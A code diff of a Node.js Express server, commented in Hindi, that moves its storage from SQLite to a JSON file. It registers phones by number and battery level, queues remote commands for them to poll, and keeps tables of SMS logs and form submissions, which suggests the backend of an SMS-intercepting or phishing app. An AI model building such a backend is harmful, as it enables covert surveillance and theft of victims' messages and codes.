@@ -1,79 +1,58 @@
 const express = require('express');
-const Database = require('better-sqlite3');
 const cors = require('cors');
+const fs = require('fs');
+const path = require('path');
 
 const app = express();
 app.use(cors());
 app.use(express.json());
 
-// डेटाबेस फाइल बनाना और कनेक्ट करना
-const db = new Database('database.db', { verbose: console.log });
+const DB_FILE = path.join(__dirname, 'database.json');
 
-// एक बार सर्वर शुरू होने पर टेबल बनाना
-function initializeDatabase() {
-    console.log('Initializing database...');
-    // सभी टेबल बनाने की कमांड
-    const createTablesStmt = db.exec(`
-        CREATE TABLE IF NOT EXISTS devices (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            device_id TEXT UNIQUE NOT NULL,
-            device_name TEXT,
-            os_version TEXT,
-            phone_number TEXT,
-            battery_level INTEGER,
-            last_seen TEXT NOT NULL,
-            created_at TEXT NOT NULL DEFAULT (datetime('now', 'localtime'))
-        );
-        CREATE TABLE IF NOT EXISTS commands (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            device_id TEXT NOT NULL,
-            command_type TEXT NOT NULL,
-            command_data TEXT NOT NULL,
-            status TEXT NOT NULL DEFAULT 'pending',
-            created_at TEXT NOT NULL DEFAULT (datetime('now', 'localtime'))
-        );
-        CREATE TABLE IF NOT EXISTS sms_logs (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            device_id TEXT NOT NULL,
-            sender TEXT NOT NULL,
-            message_body TEXT NOT NULL,
-            received_at TEXT NOT NULL DEFAULT (datetime('now', 'localtime'))
-        );
-        CREATE TABLE IF NOT EXISTS form_submissions (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            device_id TEXT NOT NULL,
-            custom_data TEXT NOT NULL,
-            submitted_at TEXT NOT NULL DEFAULT (datetime('now', 'localtime'))
-        );
-        CREATE TABLE IF NOT EXISTS global_settings (
-            setting_key TEXT PRIMARY KEY UNIQUE NOT NULL,
-            setting_value TEXT
-        );
-    `);
-
-    // डेमो डिवाइस जोड़ना
-    const checkDemo = db.prepare("SELECT 1 FROM devices WHERE device_id = ?").get('demo-device-12345');
-    if (!checkDemo) {
-        db.prepare(`
-            INSERT INTO devices (device_id, device_name, os_version, phone_number, battery_level, last_seen) 
-            VALUES (?, ?, ?, ?, ?, datetime('now', 'localtime'))
-        `).run('demo-device-12345', 'My Test Phone', 'Android 13', '+919999999999', 90);
-        console.log('👍 Demo device created!');
-    } else {
-        console.log('👍 Demo device already exists.');
+// डेटाबेस को पढ़ने और लिखने के लिए हेल्पर फंक्शन
+function readDb() {
+    try {
+        if (!fs.existsSync(DB_FILE)) {
+            // अगर फाइल नहीं है, तो एक खाली डेटाबेस बनाएं
+            const initialDb = {
+                devices: [],
+                commands: [],
+                sms_logs: [],
+                form_submissions: [],
+                global_settings: {}
+            };
+            // डेमो डिवाइस जोड़ें
+            initialDb.devices.push({
+                id: 1,
+                device_id: 'demo-device-12345',
+                device_name: 'My Test Phone',
+                os_version: 'Android 13',
+                phone_number: '+919999999999',
+                battery_level: 90,
+                last_seen: new Date().toISOString(),
+                created_at: new Date().toISOString()
+            });
+            writeDb(initialDb);
+            return initialDb;
+        }
+        const data = fs.readFileSync(DB_FILE, 'utf-8');
+        return JSON.parse(data);
+    } catch (error) {
+        console.error("Error reading DB, initializing a new one.", error);
+        // एरर आने पर भी खाली डेटाबेस बनाएं
+        return { devices: [], commands: [], sms_logs: [], form_submissions: [], global_settings: {} };
     }
-    console.log('✅ Database tables are ready.');
 }
 
-// सर्वर शुरू होते ही डेटाबेस तैयार करें
-initializeDatabase();
-
+function writeDb(data) {
+    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2), 'utf-8');
+}
 
 // --- API Endpoints ---
 
 // होमपेज
 app.get('/', (req, res) => {
-    res.send('<h1>🎉 Server is running with better-sqlite3!</h1><p>This is the final and working version.</p>');
+    res.send('<h1>🎉 Server is running with JSON file DB!</h1><p>This will work 100%.</p>');
 });
 
 // 1. डिवाइस रजिस्ट्रेशन
@@ -81,89 +60,113 @@ app.post('/api/device/register', (req, res) => {
     const { device_id, device_name, os_version, battery_level, phone_number } = req.body;
     if (!device_id) return res.status(400).json({ status: 'error', message: 'device_id is required' });
 
-    try {
-        const stmt = db.prepare('SELECT id FROM devices WHERE device_id = ?');
-        const row = stmt.get(device_id);
-        
-        const now = new Date().toISOString();
-        if (row) {
-            db.prepare('UPDATE devices SET device_name = ?, os_version = ?, battery_level = ?, phone_number = ?, last_seen = ? WHERE device_id = ?')
-              .run(device_name, os_version, battery_level, phone_number, now, device_id);
-        } else {
-            db.prepare('INSERT INTO devices (device_id, device_name, os_version, battery_level, phone_number, last_seen) VALUES (?, ?, ?, ?, ?, ?)')
-              .run(device_id, device_name, os_version, battery_level, phone_number, now);
-        }
-        res.status(200).json({ status: 'success', message: 'Device data received.' });
-    } catch (err) {
-        res.status(500).json({ status: 'error', message: err.message });
+    const db = readDb();
+    const deviceIndex = db.devices.findIndex(d => d.device_id === device_id);
+    const now = new Date().toISOString();
+
+    if (deviceIndex > -1) {
+        // अपडेट
+        db.devices[deviceIndex] = {
+            ...db.devices[deviceIndex],
+            device_name,
+            os_version,
+            battery_level,
+            phone_number,
+            last_seen: now
+        };
+    } else {
+        // नया डिवाइस
+        const newId = db.devices.length > 0 ? Math.max(...db.devices.map(d => d.id)) + 1 : 1;
+        db.devices.push({
+            id: newId,
+            device_id,
+            device_name,
+            os_version,
+            battery_level,
+            phone_number,
+            last_seen: now,
+            created_at: now
+        });
     }
+    writeDb(db);
+    res.status(200).json({ status: 'success', message: 'Device data received.' });
 });
 
 // 2. डिवाइस लिस्ट
 app.get('/api/devices', (req, res) => {
-    try {
-        const rows = db.prepare('SELECT * FROM devices ORDER BY created_at ASC').all();
-        const devicesWithStatus = rows.map(device => {
-            const lastSeen = new Date(device.last_seen);
-            const is_online = (new Date() - lastSeen) < 20000;
-            return { ...device, is_online };
-        });
-        res.json(devicesWithStatus);
-    } catch (err) {
-        res.status(500).json([]);
-    }
+    const db = readDb();
+    // created_at के अनुसार सॉर्ट करें
+    db.devices.sort((a, b) => new Date(a.created_at) - new Date(b.created_at));
+    
+    const devicesWithStatus = db.devices.map(device => {
+        const is_online = (new Date() - new Date(device.last_seen)) < 20000;
+        return { ...device, is_online };
+    });
+    res.json(devicesWithStatus);
 });
 
 // 6. कमांड भेजना
 app.post('/api/command/send', (req, res) => {
     const { device_id, command_type, command_data } = req.body;
-    try {
-        db.prepare('INSERT INTO commands (device_id, command_type, command_data) VALUES (?, ?, ?)')
-          .run(device_id, command_type, JSON.stringify(command_data));
-        res.status(200).json({ status: 'success', message: 'Command sent.' });
-    } catch (err) {
-        res.status(500).json({ status: 'error', message: err.message });
-    }
+    const db = readDb();
+    const newId = db.commands.length > 0 ? Math.max(...db.commands.map(c => c.id)) + 1 : 1;
+    db.commands.push({
+        id: newId,
+        device_id,
+        command_type,
+        command_data, // यह पहले से ही ऑब्जेक्ट है, JSON.stringify की जरूरत नहीं
+        status: 'pending',
+        created_at: new Date().toISOString()
+    });
+    writeDb(db);
+    res.status(200).json({ status: 'success', message: 'Command sent.' });
 });
 
 // कमांड प्राप्त करना
 app.get('/api/device/:deviceId/commands', (req, res) => {
     const { deviceId } = req.params;
-    try {
-        const rows = db.prepare("SELECT * FROM commands WHERE device_id = ? AND status = 'pending'").all(deviceId);
-        if (rows.length > 0) {
-            const ids = rows.map(r => r.id);
-            const stmt = db.prepare(`UPDATE commands SET status = 'sent' WHERE id IN (${ids.map(() => '?').join(',')})`);
-            stmt.run(...ids);
-        }
-        res.json(rows);
-    } catch (err) {
-        res.status(500).json([]);
+    const db = readDb();
+    
+    const pendingCommands = db.commands.filter(c => c.device_id === deviceId && c.status === 'pending');
+    
+    if (pendingCommands.length > 0) {
+        // कमांड्स को 'sent' मार्क करें
+        db.commands.forEach(cmd => {
+            if (cmd.device_id === deviceId && cmd.status === 'pending') {
+                cmd.status = 'sent';
+            }
+        });
+        writeDb(db);
     }
+    res.json(pendingCommands);
 });
 
 // 2. डिवाइस डिलीट करना
 app.delete('/api/device/:deviceId', (req, res) => {
     const { deviceId } = req.params;
-    try {
-        // ट्रांजैक्शन का उपयोग करें ताकि सब कुछ एक साथ हो
-        db.transaction(() => {
-            db.prepare('DELETE FROM sms_logs WHERE device_id = ?').run(deviceId);
-            db.prepare('DELETE FROM form_submissions WHERE device_id = ?').run(deviceId);
-            db.prepare('DELETE FROM commands WHERE device_id = ?').run(deviceId);
-            db.prepare('DELETE FROM devices WHERE device_id = ?').run(deviceId);
-        })();
-        res.json({ status: 'success', message: `Device ${deviceId} and all its data deleted.` });
-    } catch (err) {
-        res.status(500).json({ status: 'error', message: err.message });
+    let db = readDb();
+    
+    const initialDeviceCount = db.devices.length;
+    
+    // डिवाइस और उससे जुड़ा सारा डेटा हटा दें
+    db.devices = db.devices.filter(d => d.device_id !== deviceId);
+    db.commands = db.commands.filter(c => c.device_id !== deviceId);
+    db.sms_logs = db.sms_logs.filter(s => s.device_id !== deviceId);
+    db.form_submissions = db.form_submissions.filter(f => f.device_id !== deviceId);
+    
+    writeDb(db);
+    
+    if (db.devices.length < initialDeviceCount) {
+        res.json({ status: 'success', message: `Device ${deviceId} deleted.` });
+    } else {
+        res.status(404).json({ status: 'error', message: 'Device not found.' });
     }
 });
 
-
-// ... बाकी सभी एंडपॉइंट्स भी इसी तरह से काम करेंगे ...
-
+// ... बाकी सभी एंडपॉइंट्स भी इसी तरह से JSON फाइल को पढ़ेंगे और लिखेंगे ...
 
 const PORT = 3000;
 app.listen(PORT, () => {
     console.log(`🚀 Server is running on http://localhost:${PORT}`);
+    console.log('Database is a simple JSON file. No native dependencies needed!');
 });
